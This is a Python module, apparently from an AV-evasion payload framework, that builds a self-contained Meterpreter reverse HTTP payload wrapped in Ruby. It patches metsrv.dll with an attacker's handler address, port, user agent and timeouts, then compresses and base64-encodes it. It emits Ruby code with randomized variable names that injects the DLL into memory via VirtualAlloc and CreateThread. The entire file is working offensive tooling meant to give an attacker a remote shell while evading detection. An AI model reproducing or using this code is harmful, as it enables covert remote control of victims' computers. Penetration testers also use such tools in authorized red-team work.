"""

Reads in metsrv.dll, patches it with appropriate options for a 
meterpreter reverse_https payload compresses/bas64 encodes it 
and then builds a ruby injection wrapper to inject the contained 
meterpreter dll into memory.

A lot of code taken from the python contained modules and modified for ruby
Original python code from harmj0y

Module by @christruncer

"""

import struct, string, random, sys, os

from modules.common import helpers
from modules.common import encryption

import settings


class Payload:
    
    def __init__(self):
        # required options
        self.description = "Self contained meterpreter http ruby payload"
        self.language = "ruby"
        self.extension = "rb"
        self.rating = "Normal"
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "inject_method" : ["virtual", "[virtual]alloc"],
                                 "LHOST" : ["", "IP of the metasploit handler"],
                                 "LPORT" : ["443", "Port of the metasploit handler"]}
        
        
    # helper for the metasploit http checksum algorithm
    def checksum8(self, s):
        # hard rubyish way -> return sum([struct.unpack('<B', ch)[0] for ch in s]) % 0x100
        return sum([ord(ch) for ch in s]) % 0x100

    # generate a metasploit http handler compatible checksum for the URL
    def genHTTPChecksum(self, value="CONN"):
        checkValue = 0
        if value == "INITW": checkValue = 92 # normal initiation
        if value == "INITJ": checkValue = 88
        else: checkValue = 98 # 'CONN', for existing/"orphaned" connections
        
        chk = string.ascii_letters + string.digits
        for x in xrange(64):
            uri = "".join(random.sample(chk,3))
            r = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
            for char in r:
                if self.checksum8(uri + char) == checkValue:
                    return uri + char
                    
    def generate(self):
        
        if os.path.exists(settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.10/meterpreter/metsrv.x86.dll"):
            metsrvPath = settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.10/meterpreter/metsrv.x86.dll"
        else:
            print "[*] Error: You either do not have the latest version of Metasploit or"
            print "[*] Error: do not have your METASPLOIT_PATH set correctly in your settings file."
            print "[*] Error: Please fix either issue then select this payload again!"
            sys.exit()
            
        f = open(metsrvPath, 'rb')
        meterpreterDll = f.read()
        f.close()
        
        # lambda function used for patching the metsvc.dll
        dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]

        # patch the metsrv.dll header
        headerPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\xf8"
        headerPatch += "\x87\x05\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
        headerPatch += "\x68\xe0\x1d\x2a\x0a\x68\x05\x00\x00\x00\x50\xff\xd3\x00\x00\x00"
        meterpreterDll = dllReplace(meterpreterDll,0,headerPatch)

        # patch in the default user agent string
        userAgentIndex = meterpreterDll.index("METERPRETER_UA\x00")
        userAgentString = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00"
        meterpreterDll = dllReplace(meterpreterDll,userAgentIndex,userAgentString)

        # turn off SSL
        sslIndex = meterpreterDll.index("METERPRETER_TRANSPORT_SSL")
        sslString = "METERPRETER_TRANSPORT_HTTP\x00"
        meterpreterDll = dllReplace(meterpreterDll,sslIndex,sslString)

        # replace the URL/port of the handler
        urlIndex = meterpreterDll.index("https://" + ("X" * 256))
        urlString = "http://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + self.genHTTPChecksum() + "_" + helpers.randomString(16) + "/\x00"
        meterpreterDll = dllReplace(meterpreterDll,urlIndex,urlString)
        
        # replace the expiration timeout with the default value of 300
        expirationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xb64be661))
        expirationTimeout = struct.pack('<I', 604800)
        meterpreterDll = dllReplace(meterpreterDll,expirationTimeoutIndex,expirationTimeout)

        # replace the communication timeout with the default value of 300
        communicationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xaf79257f))
        communicationTimeout = struct.pack('<I', 300)
        meterpreterDll = dllReplace(meterpreterDll,communicationTimeoutIndex,communicationTimeout)

        # compress/base64 encode the dll
        compressedDll = helpers.deflate(meterpreterDll)
        
        # actually build out the payload
        payloadCode = ""
        
        payloadCode = "require 'rubygems';require 'win32/api';require 'socket';require 'base64';require 'zlib';include Win32\n"
        payloadCode += "exit if Object.const_defined?(:Ocra)\n"

        # randomly generate out variable names
        payloadName = helpers.randomString().lower()
        ptrName = helpers.randomString().lower()
        threadName = helpers.randomString().lower()
        Shellcode = helpers.randomString().lower()
        randInflateFuncName = helpers.randomString().lower()
        randb64stringName = helpers.randomString().lower()
        randVarName = helpers.randomString().lower()

        # deflate function
        payloadCode += "def "+randInflateFuncName+"("+randb64stringName+")\n"
        payloadCode += "  " + randVarName + " = Base64.decode64("+randb64stringName+")\n"
        payloadCode += "  zstream = Zlib::Inflate.new(-Zlib::MAX_WBITS)\n"
        payloadCode += "  buf = zstream.inflate("+ randVarName +")\n"
        payloadCode += "  zstream.finish\n"
        payloadCode += "  zstream.close\n"
        payloadCode += "  return buf\n"
        payloadCode += "end\n\n"

        payloadCode += Shellcode + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"

        payloadCode += "v = API.new('VirtualAlloc', 'IIII', 'I');r = API.new('RtlMoveMemory', 'IPI', 'V');c = API.new('CreateThread', 'IIIIIP', 'I');w = API.new('WaitForSingleObject', 'II', 'I')\n"
        payloadCode += "%s = %s\n" %(payloadName, Shellcode)
        payloadCode += "%s = v.call(0,(%s.length > 0x1000 ? %s.length : 0x1000), 0x1000, 0x40)\n" %(ptrName,payloadName,payloadName)
        payloadCode += "x = r.call(%s,%s,%s.length); %s = c.call(0,0,%s,0,0,0); x = w.call(%s,0xFFFFFFF)\n" %(ptrName,payloadName,payloadName,threadName,ptrName,threadName)

        return payloadCode
